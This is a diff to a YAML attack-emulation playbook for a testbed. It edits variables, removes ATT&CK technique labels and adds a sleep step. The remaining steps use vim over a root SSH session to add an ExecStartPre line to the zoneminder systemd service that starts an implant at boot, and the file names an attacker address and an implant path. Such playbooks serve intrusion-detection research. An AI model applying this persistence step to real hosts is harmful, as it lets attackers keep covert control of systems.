@@ -5,10 +5,9 @@
 ####################
 
 vars:
-  $SERVER_ADDRESS: 192.42.0.254
+  $SERVER_ADDRESS: fw.attackbed.com
   $ATTACKER_ADDRESS: 192.42.1.174
-  $DNS_SERVER: 192.42.0.233
-  $DOMAIN: aecid-testbed.com
+  $DOMAIN: attackbed.com
   $USER: aecid
   $SSH_KEY: "{{user_home.stdout}}/.ssh/privesc_key_videoserver"
   $IMPLANTPATH: /tmp/superimplant
@@ -93,37 +92,21 @@ commands:
     cmd: "vim /etc/systemd/system/multi-user.target.wants/zoneminder.service\n"
     interactive: True
     session: "root"
-    metadata:
-      techniques: "T1543.002,T1569,T1037"    
-      tactics: "Persistence"
-      technique_name: "Create or Modify System Process: Systemd Service,System Services,Boot or Logon Initialization Scripts"
 
   - type: ssh
     cmd: ":inoremap jj <ESC>\n"
     interactive: True
     session: "root"
-    metadata:
-      techniques: "T1543.002"  
-      tactics: "Persistence"
-      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     interactive: True
     cmd: "/[Service\n"
     session: "root"
-    metadata:
-      techniques: "T1543.002"  
-      tactics: "Persistence"
-      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: "o"
     interactive: True
     session: "root"
-    metadata:
-      techniques: "T1543.002"  
-      tactics: "Persistence"
-      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: ExecStartPre=sudo -g fax bash -c "/usr/bin/zmcontroller &"
@@ -138,10 +121,6 @@ commands:
     cmd: "jj"
     interactive: True
     session: "root"
-    metadata:
-      techniques: "T1543.002"  
-      tactics: "Persistence"
-      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: ":wq!\n"
@@ -363,3 +342,6 @@ commands:
       techniques: "T1046,T1018"
       tactics: "Discovery"
       technique_name: "Network Service Discovery,Remote System Discovery"
+
+  - type: sleep
+    seconds: 30
